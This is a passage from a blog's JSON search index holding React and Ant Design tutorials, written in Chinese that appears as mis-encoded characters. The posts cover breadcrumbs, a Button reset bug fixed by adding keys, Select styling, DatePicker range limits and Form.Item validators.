&lt;Breadcrumb.Item key={path.url}&gt; {path.access ? &lt;Link to={path.url}&gt;{path.label}&lt;/Link&gt; : path.label} &lt;/Breadcrumb.Item&gt; ) }) // æŠŠåšå¥½çš„éºµåŒ…å±‘å›å‚³ return ( &lt;Breadcrumb style={{ marginBottom: '30px' }} &gt; {Breadcrumbitems} &lt;/Breadcrumb&gt; )}export default PageBreadcrumb æ¥è‘—åªè¦åœ¨å°æ‡‰çš„å…ƒä»¶ä¸Šä½¿ç”¨å°±è¡Œäº†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839import React from 'react'import { Link } from 'react-router-dom'import PageBreadcrumb, { Paths } from '../PageBreadcrumb'const List: React.FC = () =&gt; { const breadcrumpPaths: Paths[] = [ { url: '/', label: 'Home', access: true }, { url: '/app', label: 'App', access: true }, { url: '/app/list', label: 'List', access: true } ] return ( &lt;&gt; &lt;PageBreadcrumb paths={breadcrumpPaths} /&gt; &lt;ul&gt; {Array.from({ length: 10 }, (_, index) =&gt; { return ( &lt;li key={index}&gt; &lt;Link to={(index + 1).toString()}&gt;List item {index + 1}&lt;/Link&gt; &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )}export default List é€™æ¨£çš„ç¼ºé»æ˜¯æ¯ä¸€å€‹é é¢éƒ½å¾—å„åˆ¥è™•ç†éºµåŒ…å±‘å…ƒä»¶ï¼Œä½†æ›ä¾†çš„å¥½è™•æ˜¯å¯ä»¥æœ‰æ›´å¤§çš„å½ˆæ€§ã€‚ç¸½ä¹‹æˆ‘è¦ºå¾—è¦ç”¨å“ªä¸€ç¨®æ–¹æ³•éƒ½å¯ä»¥ï¼Œç«¯çœ‹ä½ åå¥½å“ªå€‹ï¼Œæœ€å¾Œä¸€æ¨£é™„ä¸Šç¯„ä¾‹ã€‚","link":"/2022/05/16/antd-breadcrumb/"},{"title":"Ant Designï¼ä½¿ç”¨ Button æ™‚å¯èƒ½æœƒç¢°åˆ°çš„åœ°é›·","text":"åŸ‹è—ç„æ©Ÿçš„åœ°é›·ã€‚ ç°¡è¿°é€™æ˜¯æˆ‘è‡ªå·±åœ¨å·¥ä½œä¸Šè¸©åˆ°çš„ä¸€å€‹åœ°é›·ï¼ŒåŸå…ˆåœ¨ debug çš„éç¨‹ä¸­ä»¥ç‚ºæ˜¯ Antd è¨­è¨ˆä¸Šçš„å•é¡Œï¼Œä¸€ç›´åˆ°æœ€å¾Œæ‰¾å‡ºç­”æ¡ˆæ™‚æ‰ç™¼ç¾é€™ä¼¼ä¹è·Ÿ React çš„æ¸²æŸ“æ©Ÿåˆ¶æœ‰é»ç›¸é—œï¼Œç¸½ä¹‹è®“æˆ‘å€‘ä¾†é‡ç¾ä¸€ä¸‹ç•¶æ™‚çš„æƒ…å¢ƒå§ã€‚ é€™é‚Šè¦åšçš„æ˜¯é€™æ¨£çš„åŠŸèƒ½ï¼š ç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹èƒ½åˆ‡æ›ç·¨è¼¯å’Œé–±è®€çš„è¡¨å–®è€Œå·²ï¼Œç„¶å¾Œåœ¨ç·¨è¼¯æ™‚æœƒå‡ºç¾ã€ŒResetã€é€™å€‹æŒ‰éˆ•ã€‚ å¯¦ä½œçš„åŸå§‹ç¢¼å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627import React, { useState } from 'react'import 'antd/dist/antd.css'import './index.css'import { Button, Input, Form } from 'antd'const App = () =&gt; { const [isEdit, setIsEdit] = useState(false) return ( &lt;Form&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; &lt;Button htmlType='reset'&gt;Reset&lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='submit'&gt;Save&lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; )}export default App é™„è¨»ï¼šCodeSandbox ç™¼ç¾å•é¡Œå‰›å‰›çš„ç¯„ä¾‹å¦‚æœä»”ç´°ä½¿ç”¨çš„è©±æœƒç™¼ç¾ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯ã€Œæ¯ç•¶æˆ‘æŒ‰ä¸‹ Edit æ™‚å…§å®¹æœƒè‡ªå‹•è¢« resetã€ï¼š çœ‹èµ·ä¾†å°±åƒæ˜¯è‡ªå‹•è¢«åŸ·è¡Œäº† reset ä¸€æ¨£ï¼Ÿç‚ºäº†æ‰¾å‡ºå•é¡Œæˆ‘å€‘å¯ä»¥åœ¨ &lt;Form&gt; åŠ ä¸Š onReset ä¾†æª¢æŸ¥çœ‹çœ‹ï¼š 1234567891011121314151617// åŠ ä¸Š log ä¾†ç¢ºèªæ˜¯å¦è¢«åŸ·è¡Œ&lt;Form onReset={() =&gt; console.log('onReset')}&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; &lt;Button htmlType='reset'&gt;Reset&lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='submit'&gt;Save&lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt;&lt;/Form&gt; æœç„¶ä¸å‡ºæ‰€æ–™ï¼Œæ¯ç•¶æˆ‘å€‘æŒ‰ä¸‹ Edit æŒ‰éˆ•æ™‚ onReset éƒ½æœƒå°å‡ºè¨Šæ¯ï¼Œä¹Ÿå°±æ˜¯èªªæ¯æ¬¡æŒ‰ä¸‹ Edit æ™‚éƒ½æœƒé‡æ–° reset å…§å®¹ã€‚ ä¸éé€™æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿç•¶æ™‚æˆ‘ç¬¬ä¸€å€‹æ‡·ç–‘çš„é»æ˜¯ reset é€™å€‹æŒ‰éˆ•ï¼š 1&lt;Button htmlType='reset'&gt;Reset&lt;/Button&gt; æ‰€ä»¥æˆ‘è©¦è‘—æŠŠæŒ‰éˆ•æ‹¿æ‰ä¾†æ¸¬è©¦çœ‹çœ‹ï¼ŒæœçœŸæ²’æœ‰å‡ºç¾å†å‡ºç¾ reset çš„æƒ…å½¢ã€‚ é›–ç„¶å•é¡Œè§£æ±ºäº†ï¼Œä½†æˆ‘é‚„æ˜¯è¦ºå¾—å¾ˆå¥‡æ€ªï¼Œç‚ºä»€éº¼åªæ˜¯åˆ‡æ›è€Œå·²å°±æœƒè§¸ç™¼ resetï¼Ÿæ–¼æ˜¯æˆ‘å¾Œä¾†åˆå¤šåšäº†å¹¾é …æ¸¬è©¦ï¼Œæ‰ç™¼ç¾äº†ä¸€å€‹é—œéµé»ï¼Œé€™æ˜¯å¾ Antd çš„æŒ‰éˆ•ä¸­ç™¼ç¾çš„ã€‚ æˆ‘å€‘å…ˆä¾†çœ‹æ®µç¯„ä¾‹ï¼Œå†ä¾†è§£é‡‹ä¸€ä¸‹æˆ‘ç™¼ç¾äº†ä»€éº¼ã€‚ åº•ä¸‹æ˜¯ä¸€å€‹åˆ‡æ›æŒ‰éˆ•çš„ç¯„ä¾‹ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æ ¹æ“š state ä¾†é¡¯ç¤ºä¸åŒçš„æŒ‰éˆ•è€Œå·²ï¼Œéå¸¸ç°¡å–®ï¼š 123456789101112131415function App() { const [isEdit, setIsEdit] = useState(false) return ( &lt;div className='wrapper'&gt; {isEdit ? ( &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; )}export default App ç”¨çœ‹çš„å°±å¤§æ¦‚çŸ¥é“æœƒç™¼ç”Ÿä»€éº¼äº†å°å§ï¼Ÿä¸éè«‹ä»”ç´°çœ‹çœ‹ä¸‹é¢çš„æ¼”ç¤ºï¼Œçœ‹èƒ½ä¸èƒ½å¾ä¸­ç™¼ç¾ä»€éº¼ï¼š æƒ³å¥½çš„è©±å†å¾€ä¸‹çœ‹å§ã€‚ æˆ‘æ˜¯é˜²é›·ç·šâ€¦ æˆ‘æ˜¯é˜²é›·ç·šâ€¦ æˆ‘æ˜¯é˜²é›·ç·šâ€¦ æˆ‘æ˜¯é˜²é›·ç·šâ€¦ æˆ‘æ˜¯é˜²é›·ç·šâ€¦ æŒ‰éˆ•ç¢ºå¯¦æœ‰ä¾ç…§æˆ‘å€‘æƒ³çš„å»åšåˆ‡æ›ï¼Œä¸éä½ æœ‰æ²’æœ‰ç™¼ç¾åˆ° æŒ‰éˆ•çš„ active ç‹€æ…‹ï¼ˆæ¨£å¼ï¼‰ ä¹Ÿè¢«ä¿ç•™ä¸‹ä¾†äº†å‘¢ï¼Ÿé€™å€‹å°±æ˜¯é—œéµé»ã€‚ ç•¶æˆ‘å€‘æŠŠæŒ‰éˆ•å¾ Edit åˆ‡æ›æˆ Cancel æ™‚ï¼Œç…§ç†ä¾†èªªæ‡‰è©²è¦æ˜¯ä¸€å€‹ã€Œå…¨æ–°çš„æŒ‰éˆ•ã€ï¼Œæ›å¥è©±èªªå°±æ˜¯æ²’æœ‰è¢«é»æ“Šéï¼Œæ‰€ä»¥ä¸è©²æœ‰ active çš„ç‹€æ…‹ã€‚ ä¸é React ç‚ºäº†ç¯€çœä¸€äº›é–‹éŠ·ï¼Œæ‰€ä»¥åœ¨é‡æ–°æ¸²æŸ“æ™‚çš„å¯¦éš›æµç¨‹æ˜¯é€™æ¨£ï¼š æŠŠæ–°çš„è·ŸèˆŠçš„æŒ‰éˆ•åšæ¯”å° æŠŠçœŸæ­£éœ€è¦æ›´æ–°çš„å…§å®¹çµ¦æ›¿æ›æ‰ é€™æ¨£å­çš„æ©Ÿåˆ¶å°±æœ‰æ©Ÿç‡å‡ºç¾åƒä¸Šé¢é€™ç¨®ã€ŒæŒ‰éˆ•è¢«æ›´æ–°äº†ï¼Œä½†å»ä¿ç•™äº†åŸæœ¬çš„å…§å®¹ï¼ˆactive ç‹€æ…‹ï¼‰ã€çš„å•é¡Œã€‚ é™„è¨»ï¼šåœ¨ Vue è£¡é¢å…¶å¯¦ä¹Ÿæœƒå‡ºç¾é¡ä¼¼çš„å•é¡Œï¼Œå¯ä»¥åƒè€ƒé€™å€‹ç¯„ä¾‹ã€‚ ç¸½ä¹‹æœ€å¾Œç¹äº†ä¸€å¤§åœˆæ‰ç™¼ç¾åŸä¾†æ•´å€‹å•é¡Œçš„åŸå› è·Ÿ React æ¸²æŸ“æ©Ÿåˆ¶æœ‰é—œï¼ŒçœŸçš„æ˜¯æç„¶å¤§æ‚Ÿå•Š~ è§£æ±ºå•é¡Œæ—¢ç„¶çŸ¥é“å•é¡Œæ˜¯å‡ºåœ¨æ¸²æŸ“ä¸Šçš„è©±ï¼Œé‚£è§£æ³•è‡ªç„¶ä¹Ÿå¾ˆæ¸…æ¥šäº†ã€‚ è¦é¿å… React é‡ç”¨åŸæœ¬çš„ DOM å…ƒç´ çš„è©±ï¼Œåªè¦åœ¨è©²å…ƒç´ ä¸ŠåŠ ä¸Š key å°±è¡Œäº†ï¼š 123456789101112131415161718192021function App() { const [isEdit, setIsEdit] = useState(false) return ( &lt;div className='wrapper'&gt; {isEdit ? ( // åŠ ä¸Š key &lt;Button key='cancel' onClick={() =&gt; setIsEdit(false)}&gt; Cancel &lt;/Button&gt; ) : ( // åŠ ä¸Š key &lt;Button key='edit' onClick={() =&gt; setIsEdit(true)}&gt; Edit &lt;/Button&gt; )} &lt;/div&gt; )}export default App é€™æ¨£å­å°±æœƒå¼·åˆ¶è®“ React ä¸è¦ç”¨ã€Œæ›´æ”¹å…§å®¹ã€çš„æ–¹å¼ä¾†é‡æ–°æ¸²æŸ“ï¼Œè€Œæ˜¯ç›´æ¥ã€Œé‡æ–°æ¸²æŸ“é€™å€‹ DOM å…ƒç´ ã€ï¼Œæ›å¥è©±èªªå°±æ˜¯ã€Œæˆ‘æ¯ä¸€æ¬¡éƒ½è¦é‡æ–°ç”¢ç”Ÿé€™å€‹æŒ‰éˆ•ï¼Œå°±ç®—æœ‰å…¶ä»–é¡ä¼¼çš„æŒ‰éˆ•æˆ‘ä¹Ÿä¸è¦æ‹¿ä¾†ç”¨ï¼Œæˆ‘å°±æ˜¯è¦å®Œå®Œå…¨å…¨æ˜¯å…¨æ–°çš„ä¸€å€‹å•¦ï¼ˆä»»æ€§ï¼Ÿï¼‰ã€ã€‚ ä¿®æ”¹å®Œå¾Œå†æ¸¬ä¸€æ¬¡ï¼Œå°±ä¸æœƒå†å‡ºç¾ active çš„æ¨£å¼äº†ï¼š å› ç‚ºæ¯ä¸€æ¬¡éƒ½æ˜¯ä¸€å€‹å…¨æ–°çš„æŒ‰éˆ•ï¼Œæ‰€ä»¥ä¸æœƒåœ¨é€™å€‹æŒ‰éˆ•èº«ä¸Šçœ‹åˆ°ä»»ä½•å…¶ä»–æŒ‰éˆ•çš„å½±å­ï¼Œä»–æ°¸é æœƒæ˜¯ä»–è‡ªå·±è€Œå·²ã€‚ å›æ­¸åˆ°æœ€é–‹å§‹çš„ç¯„ä¾‹è¤‡ç¿’ä¸€ä¸‹æœ€åŸæœ¬çš„ç¯„ä¾‹ï¼Œä¹‹æ‰€ä»¥æœƒç™¼ç”Ÿé‚£æ¨£çš„å•é¡Œå°±æ˜¯å› ç‚ºã€ŒæŒ‰éˆ•è¢«é‡è¤‡ä½¿ç”¨ã€çš„é—œä¿‚ï¼Œè¤‡ç¿’ä¸€ä¸‹é€™å¼µåœ–ï¼š æœ‰æ³¨æ„åˆ° Edit æŒ‰ä¸‹ä»¥å¾Œåˆ‡æ›åˆ°æ–°çš„æŒ‰éˆ•æ™‚ï¼ŒReset ä¹Ÿä¿ç•™äº† active çš„æ¨£å¼å—ï¼Ÿé€™æ¨£ä»£è¡¨ Reset å°±æ˜¯æ‹¿ Edit ä¾†æ”¹çš„æ„æ€ã€‚ é€™å€‹æ™‚å€™å‘¢ï¼Œå› ç‚º Reset æŒ‰éˆ•æœ‰ htmlType=\"reset\" é€™å€‹ propsï¼Œæ‰€ä»¥å°±æœƒè§¸ç™¼ã€ŒæŠŠè¡¨å–®é‡ç½®ã€çš„é è¨­è¡Œç‚ºï¼Œæ‰€ä»¥è¡¨å–®å°±è¢«é‡ç½®äº†ã€‚ æ‰€ä»¥å¦‚æœä½ æŠŠ Reset è·Ÿ Save çš„ä½ç½®äº¤æ›çš„è©±ï¼Œå°±æœƒç™¼ç¾è®Šæˆè§¸ç™¼ htmlType=\"submit\" çš„é è¨­è¡Œç‚ºï¼š 1234567891011121314151617181920212223242526const App = () =&gt; { const [isEdit, setIsEdit] = useState(false) return ( &lt;Form onReset={() =&gt; console.log('reset')} onFinish={() =&gt; console.log('submit')}&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; {/* æŠŠ Save æ”¾åˆ°æœ€å‰é¢ */} &lt;Button htmlType='submit'&gt;Save&lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='reset' onClick={() =&gt; console.log('click')}&gt; Reset &lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; )}export default App æ‰€ä»¥å°±è·Ÿå‰é¢èªªçš„ä¸€æ¨£ï¼Œåªè¦æŠŠè©²é‡æ–°æ¸²æŸ“çš„å…ƒç´ åŠ ä¸Š key å°±å¯ä»¥è§£æ±ºäº†ï¼š 12345678910111213141516171819202122232425262728const App = () =&gt; { const [isEdit, setIsEdit] = useState(false) return ( &lt;Form onReset={() =&gt; console.log('reset')} onFinish={() =&gt; console.log('submit')}&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; {/* åŠ ä¸Š key */} &lt;Button key='submit' htmlType='submit'&gt; Save &lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='reset' onClick={() =&gt; console.log('click')}&gt; Reset &lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; )}export default App é™„è¨»ï¼šCodeSandbox","link":"/2022/09/23/antd-button-problem/"},{"title":"Ant Designï¼å®¢è£½åŒ– Select","text":"Antd çš„å½ˆæ€§çœŸçš„è »å¤§çš„ã€‚ ç°¡è¿°ç›´æ¥ä¾†çœ‹æƒ³åšå‡ºçš„æ•ˆæœï¼š æˆ‘å¸Œæœ›åœ¨é¸é …ä¸­æ–°å¢ä¸€å€‹ã€ŒAdd Optionã€çš„é¸é …ï¼Œä¸¦ä¸”å°é€™å€‹é¸é …åšä¸€äº› CSS è¨­å®šã€‚ç¬¬ä¸€å€‹æœƒç¢°åˆ°çš„å•é¡Œæ˜¯ï¼š æˆ‘è©²æ€éº¼ç”¨ selector æŒ‡åˆ°é¸é …å•Šï¼Ÿ æˆ‘å€‘å¯ä»¥å…ˆä¾†è§€å¯Ÿ DOM çµæ§‹ï¼Œé¦–å…ˆèƒ½çœ‹åˆ° Popup çš„ä¸‹æ‹‰é¸å–®é è¨­æœƒæ¸²æŸ“åœ¨ &lt;/body&gt; ä¹‹å‰ï¼š çŸ¥é“çµæ§‹å¾Œæˆ‘å€‘å°±èƒ½å¤§æ¦‚çŸ¥é“è©²æŠŠ className åŠ åœ¨å“ªè£¡äº†ï¼š popup çš„å®¹å™¨å…ƒç´  ã€ŒAdd Optionã€çš„é¸é … ç¬¬ä¸€å€‹åœ°æ–¹å¯ä»¥ç”¨ dropdownClassName é€™å€‹ props ä¾†è¨­å®šï¼š 1234567&lt;Select className='demo-select' dropdownClassName='demo-select-dropdown' options={list} onChange={onChange} value={selected}/&gt; æ³¨æ„ä¸è¦è·Ÿ className ææ··äº†ï¼Œé€™å€‹æœƒè¨­å®šåˆ°çš„ä½ç½®æ˜¯ select box æœ¬èº«ï¼ˆé‚£å€‹æ¡†æ¡†ï¼‰ï¼Œä¸æ˜¯ popup çš„ dropdownã€‚ ç¬¬äºŒå€‹åœ°æ–¹å‰‡æ˜¯èƒ½åœ¨ options ä¸­å¤šå‚³ä¸€å€‹ className çš„å±¬æ€§ï¼š 12345678910111213141516171819const [list, setList] = useState([ { className: 'add', // åŠ ä¸Š className label: 'Add Option', value: 'add' }, { label: 'A', value: 'a' }, { label: 'B', value: 'b' }, { label: 'C', value: 'c' }]) æœ€å¾Œå°±å¯ä»¥åœ¨ CSS ä¸­åšè¨­å®šå›‰ï¼š 123456789/* é¸å–æ¡†æ¡†çš„æ¨£å¼ */.demo-select { min-width: 300px;}/* popup çš„é¸é … */.demo-select-dropdown .add { color: dodgerblue; border-bottom: 1px solid #d4e3fc;} é€™é‚Šçš„å®Œæ•´ç¯„ä¾‹å¯ä»¥åˆ°é€™é‚Šåƒè€ƒã€‚","link":"/2022/09/18/antd-customize-select/"},{"title":"Ant Designï¼DatePicker","text":"å¤šç·´ç¿’å¤šç­†è¨˜ã€‚ åŸºæœ¬å–å€¼å¦‚æœè¦åœ¨é¸å–æ—¥æœŸå¾Œå–å‡ºå€¼ï¼Œå¯ä»¥ç”¨ onChange ä¾†ç•¶ä½œ handlerã€‚ é€™å€‹ handler æœƒè¢«å‚³å…¥ï¼š momentï¼Œæ²’çŒœéŒ¯çš„è©±æ‡‰è©²å°±æ˜¯é€™å€‹æ±è¥¿ï¼Œæ‰€ä»¥æœ‰éœ€è¦å¯ä»¥åƒè€ƒç›¸é—œçš„ API dateStringï¼Œåƒé€™æ¨£çš„æ ¼å¼å­—ä¸²ï¼š2022-05-31 12345678910111213import React from 'react'import { DatePicker, message } from 'antd'function Main() { // å›å‚³å…¥ moment ç‰©ä»¶ï¼Œä¸éé€™é‚Šæ²’è¾¦æ³•æŒ‡å®šæ‰€ä»¥æ‰è¨­ç‚º any const handleChange = (current: any, dateString: string): void =&gt; { message.info(current ? `You select date is ${current.format('YYYY-MM-DD')}` : 'Not choose') } return &lt;DatePicker onChange={handleChange} /&gt;}export default Main é™åˆ¶ç¯„åœå‡è¨­æˆ‘æœ‰å…©å€‹é¸é …ï¼Œä¸€å€‹æ˜¯ã€Œé–‹å§‹æ—¥æœŸï¼ˆStartï¼‰ã€ï¼Œä¸€å€‹æ˜¯ã€ŒçµæŸæ—¥æœŸï¼ˆEndï¼‰ã€ã€‚ åŸºæœ¬ä¸Šéƒ½æœƒå¸Œæœ›èƒ½é¸å–çš„ç¯„åœæ˜¯ Start ä¸å¯ä»¥ã€Œå¤§æ–¼ã€Endï¼ŒEnd ä¸å¯ä»¥ã€Œå°æ–¼ã€Start é€™æ¨£çš„è¦å‰‡ï¼Œæ‰€ä»¥å¯ä»¥é€™æ¨£å¯«ï¼š 12345678910111213141516171819202122232425262728293031323334import React from 'react'import { Form, DatePicker } from 'antd'import { useForm } from 'antd/lib/form/Form'function Main() { const [form] = useForm() const getDisabledDateFrom = (current: moment.Moment): boolean =&gt; { // å¦‚æœ to æœ‰å€¼ï¼ŒæŠŠ to &lt; from çš„ disabled return !form.getFieldValue('dateTo') ? false : form.getFieldValue('dateTo').valueOf() - 86400000 &lt; current.valueOf() } const getDisabledDateTo = (current: moment.Moment): boolean =&gt; { // å¦‚æœ from æœ‰å€¼ï¼ŒæŠŠ from &gt; to çš„ disabled return !form.getFieldValue('dateFrom') ? false : form.getFieldValue('dateFrom').valueOf() + 86400000 &gt; current.valueOf() } return ( &lt;&gt; &lt;Form form={form} autoComplete='off' validateTrigger={['onBlur', 'onChnage']}&gt; &lt;Form.Item label='Date From' name='dateFrom'&gt; &lt;DatePicker disabledDate={getDisabledDateFrom} /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Date To' name='dateTo'&gt; &lt;DatePicker disabledDate={getDisabledDateTo} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/&gt; )}export default Main é€™é‚Šå¯ä»¥ç”¨ disabledDate é€™å€‹ props ä¾†å¯¦ä½œï¼Œè£¡é¢è¦å‚³å…¥ä¸€å€‹ functionï¼Œä¸¦æ ¹æ“šå®ƒçš„å›å‚³å€¼ä¾†æ±ºå®šæ˜¯å¦å¯é¸ã€‚ å›å‚³ true çš„æœƒè¢«ç¦ç”¨ å›å‚³ false çš„æœƒè¢«å•Ÿç”¨ ç°¡å–®ä¾†èªªæ˜¯é€™æ¨£å­ã€‚ è‡³æ–¼é€™å€‹ function ä»€éº¼æ™‚å€™æœƒè¢«è§¸ç™¼ï¼Ÿä½ å¯ä»¥æƒ³æˆæ˜¯é»é–‹ DataPiacker çš„æ™‚å€™ï¼Œæ‰€ä»¥ä½ å°±å¾—åœ¨é€™å€‹æ™‚å€™ä¾†åšè™•ç†ï¼Œæ‹¿ã€Œé–‹å§‹æ—¥æœŸã€çš„é€™ä¸€æ®µä¾†è§£é‡‹ï¼š 12345678910const getDisabledDateFrom = (current: moment.Moment): boolean =&gt; { // å¦‚æœ to æœ‰å€¼ï¼ŒæŠŠ to &lt; from çš„ disabled return !form.getFieldValue('dateTo') ? false : form.getFieldValue('dateTo').valueOf() - 86400000 &lt; current.valueOf()};&lt;Form.Item label='Date From' name='dateFrom'&gt; &lt;DatePicker disabledDate={getDisabledDateFrom} /&gt;&lt;/Form.Item&gt; æˆ‘å¸Œæœ›é»é–‹çš„æ™‚å€™åšå…©ä»¶äº‹ï¼š å…ˆæª¢æŸ¥ã€ŒçµæŸæ—¥æœŸã€æœ‰æ²’æœ‰å€¼ form.getFieldValue('dateTo') å¦‚æœæœ‰å€¼ï¼ŒæŠŠæ¯”ä»–æ—©çš„æ—¥æœŸéƒ½ç¦ç”¨æ‰ æ²’æœ‰å€¼çš„è©±ï¼Œå°±ä¸åšä»»ä½•äº‹ï¼ˆretrun falseï¼‰ é€™å°±æ˜¯ getDisabledDateFrom åœ¨åšçš„äº‹æƒ…ã€‚ è£¡é¢æœ‰ç”¨åˆ° form ä¾†å–å‡ºæ¬„ä½çš„å€¼ï¼Œé€™å€‹æ˜¯é€é useForm ä¾†åšçš„ï¼Œæœ‰èˆˆè¶£å¯ä»¥åƒè€ƒ Ant Designï¼è¡¨å–®ç›¸é—œå…ƒä»¶ã€‚ å¦å¤–è¦é †ä¾¿æçš„æ˜¯ï¼ŒDataPicker çš„èƒŒå…¶å¯¦å¾Œæ˜¯é€é moment.js ä¾†å¯¦ä½œçš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ handler ä¸­æ‹¿åˆ° moment é€™å€‹ç‰©ä»¶ï¼Œè·Ÿå–æ¬„ä½å€¼çš„æ™‚å€™ä¹Ÿæ˜¯ã€‚ç¸½ä¹‹åªè¦åˆ©ç”¨ç›¸é—œçš„ method ä¾†åšè™•ç†ï¼Œå°±èƒ½æ±ºå®šå›å‚³ true / flase äº†ã€‚ æœ€å¾Œæ˜¯å€‹å°è£œå……ï¼Œ86400000 æ˜¯ä¸€å¤©çš„æ¯«ç§’æ•¸ï¼Œå› ç‚ºæˆ‘ä¸å¸Œæœ›åœ¨ Start é¸äº† 5/20 çš„æ™‚å€™ End é‚„å¯ä»¥é¸åˆ° 5/20ï¼ˆæˆ–åéä¾†ï¼‰ï¼Œæ‰€ä»¥æ‰è¦å¾€å‰ or å¾€å¾Œä¸€å¤©ã€‚","link":"/2022/05/21/antd-date-picker/"},{"title":"Ant Designï¼Form.Item","text":"å¾ˆå¤šå¥½ç”¨çš„éƒ½è—åœ¨é€™ã€‚ å¸¸çŠ¯éŒ¯èª¤ ç•¶ Form.Item è¨­ç½® name ä»¥å¾Œå°±ç„¡æ³•å†å°è¡¨å–®ç¨è‡ªè¨­å®š value å€¼ ç•¶ Form.Item è¢« re-render æ™‚ onResetï¼ˆ&lt;Form&gt; çš„ propsï¼‰ ä¹Ÿæœƒè¢«è§¸ç™¼ rules åªèƒ½åœ¨ Form.item æœ‰è¨­ç½® name æ™‚æ‰æœ‰æ•ˆã€‚ validate&lt;Form.Item&gt; ä¸­æœ‰ä¸€å€‹çš„ rule çš„ props å¯ä»¥å‚³ï¼Œæœ€å¸¸è¦‹çš„ç”¨æ³•æ˜¯é€™æ¨£å­ï¼š 123456789101112131415&lt;Form form={form} labelCol={{ span: 24 }} wrapperCol={{ span: 24 }}&gt; &lt;Form.Item name='phone' label='Phone' rules={[ { required: true, message: 'Phone number cannot be blank.' } ]} &gt; &lt;Input type='tel' /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; æ²’ä»€éº¼ï¼Œå°±åªæ˜¯ä¸€å€‹å¿…å¡«é …ç›®çš„é©—è­‰è€Œå·²ã€‚ ä¸éç•¶ä½ ç¢°åˆ°æ¯”è¼ƒè¤‡é›œçš„é‚è¼¯æ™‚ï¼Œå¯èƒ½æœƒæƒ³å¯«ä¸€äº›ã€Œé©—è­‰å‡½å¼ã€ä¾†åšè‡ªå®šç¾©é©—è­‰ï¼Œé€™å€‹å°±æ˜¯ validate çš„é©ç”¨æ™‚æ©Ÿã€‚ ä»–çš„å¯«æ³•æœƒé•·é€™æ¨£ï¼š 1234567891011121314151617181920212223242526&lt;Form form={form} labelCol={{ span: 24 }} wrapperCol={{ span: 24 }}&gt; &lt;Form.Item name='phone' label='Phone' rules={[ // é™£åˆ—å€¼æ˜¯ä¸€å€‹ function (form) =&gt; { // é€™å€‹ function ä¸­å¯ä»¥æ‹¿åˆ° form instance console.log('form instance', form) // å›å‚³ä¸€å€‹ç‰©ä»¶ï¼Œå€¼ç‚º validatorï¼ˆé©—è­‰å‡½å¼ï¼‰ return { validator: (rule, value) =&gt; { console.log('rule', rule) console.log('value', value) // å›å‚³ Promise.resolve() / Promise.reject() è¡¨ç¤ºé€šéæˆ–æœªé€šé return Promise.resolve() } } } ]} &gt; &lt;Input type='tel' /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; é™„è¨»ï¼šé›–ç„¶æ˜¯å›å‚³ Promise ä½†ä¸¦ä¸æ˜¯ã€ŒéåŒæ­¥ã€åŸ·è¡Œå“¦ï¼Œä½ è©¦è‘—åœ¨è£¡é¢ç”¨ while å»è·‘ã€ŒåŒæ­¥ã€å»¶é²çš„è©±å°±èƒ½çœ‹åˆ° blocking çš„ç¾è±¡äº†ã€‚ å¯«æ³•æœƒæ¯”å‰›å‰›è¤‡é›œä¸€é»ï¼Œä½†ä¸»è¦æ˜¯ç‚ºäº†çµ¦ä½ ä¸€äº›ç”¨ä¾†å–å¾—è³‡è¨Šçš„åƒæ•¸ï¼Œæ‰€ä»¥æ‰æœƒçœ‹èµ·ä¾†æœƒå¯«å¾ˆå¤šå±¤ã€‚ ä¸éç…§è‘—ä¸Šé¢çš„è¨»è§£ä¾†çœ‹æ‡‰è©²å°±èƒ½ç†è§£äº†ï¼Œä¾‹å¦‚æˆ‘ç¾åœ¨è¼¸å…¥ 1 çš„è©±ï¼Œå°±æœƒå°å‡ºé€™æ¨£çš„çµæœï¼š 